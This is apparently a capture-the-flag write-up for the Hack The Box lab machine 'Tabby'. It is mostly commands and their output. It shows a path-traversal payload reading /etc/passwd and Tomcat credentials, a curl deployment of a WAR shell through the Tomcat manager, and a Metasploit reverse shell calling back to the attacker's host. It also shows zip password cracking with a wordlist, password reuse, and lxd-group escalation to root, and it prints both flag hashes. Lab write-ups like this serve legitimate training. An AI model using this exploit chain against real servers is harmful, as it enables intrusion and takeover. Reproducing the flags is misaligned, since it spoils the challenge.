# Tabby

## SYN Scan
```
nmap -sS -sV -O -p- -v -T4 -Pn -oA nmap/full_syn 10.10.10.194

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache Tomcat

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Mega Hosting
`Port: 80`

![tomcat](./screenshots/mega_hosting.png)

## Tomcat
`Port: 8080`

![tomcat](./screenshots/tomcat.png)

## Arbitrary Local File Read
```http
GET /news.php?file=../../../../../../../../etc/passwd HTTP/1.1
Host: megahosting.htb
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

```http
HTTP/1.1 200 OK
Date: Fri, 16 Apr 2021 13:08:08 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1850
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
....
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

## Tomcat User Enumaration
```http
GET /news.php?file=../../../../../../../../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml HTTP/1.1
Host: megahosting.htb
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

```xml
...
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
...
```

## Tomcat Login
```
tomcat:$3cureP4s5w0rd123!
```

![tomcat_admin_gui](./screenshots/tomcat_admin_gui.png)

## Tomcat Text Interface
![tomcat_text](./screenshots/tomcat_text.png)

## Tomcat Upload War File via Text Interface
Uploaded a `war` file by using tomcat's text interface.

```
$ curl --upload-file shell.war 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/foo'   
OK - Deployed application at context path [/foo]
```

`http://10.10.10.194:8080/foo/`

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Command shell session 4 opened (10.10.14.11:4444 -> 10.10.10.194:42578) at 2021-04-16 17:21:42 +0300

id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

## Encrypted Backup ZIP File
```
(remote) tomcat@tabby:/var/www/html/files$ ls -l
total 28
-rw-r--r-- 1 ash  ash  8716 Jun 16  2020 16162020_backup.zip
```

### Cracked The ZIP's Password
```
$ fcrackzip -v -u -D -p ~/storage/wordlists/rockyou.txt 16162020_backup.zip 
'var/www/html/assets/' is not encrypted, skipping
found file 'var/www/html/favicon.ico', (size cp/uc    338/   766, flags 9, chk 7db5)
'var/www/html/files/' is not encrypted, skipping
found file 'var/www/html/index.php', (size cp/uc   3255/ 14793, flags 9, chk 5935)
found file 'var/www/html/logo.png', (size cp/uc   2906/  2894, flags 9, chk 5d46)
found file 'var/www/html/news.php', (size cp/uc    114/   123, flags 9, chk 5a7a)
found file 'var/www/html/Readme.txt', (size cp/uc    805/  1574, flags 9, chk 6a8b)
checking pw arizon09                                

PASSWORD FOUND!!!!: pw == admin@it
```

```
$ unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
```

## Privilege Escalation (ash)
Used the password of the backup zip file to log in as `ash`.

```
ash:admin@it
```

```
ash@tabby:/var/www/html$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)`
```

## The User Flag
```
ash@tabby:~$ ls -l
total 4
-rw-r----- 1 ash ash 33 Apr 16 14:08 user.txt
```

```
ash@tabby:~$ cat user.txt 
8b521a9dadb599908d23252797157dcf
```

## Privilege Escalation (root)
`ash` is in `lxd` group, so that he can create containers by using lxd.

https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

```
ash@tabby:/dev/shm$ lxc exec mycontainer /bin/sh
```

```
~ # chroot /mnt/root/
root@mycontainer:/# id
uid=0(root) gid=0(root) groups=0(root)
```

## The Root Flag
```
root@mycontainer:/# ls -l /root/
total 8
-rw-r--r-- 1 root root   33 Apr 16 14:08 root.txt
```

```
root@mycontainer:/# cat /root/root.txt 
1b56d5ffe1b802eeb77e1e32006664e8
```
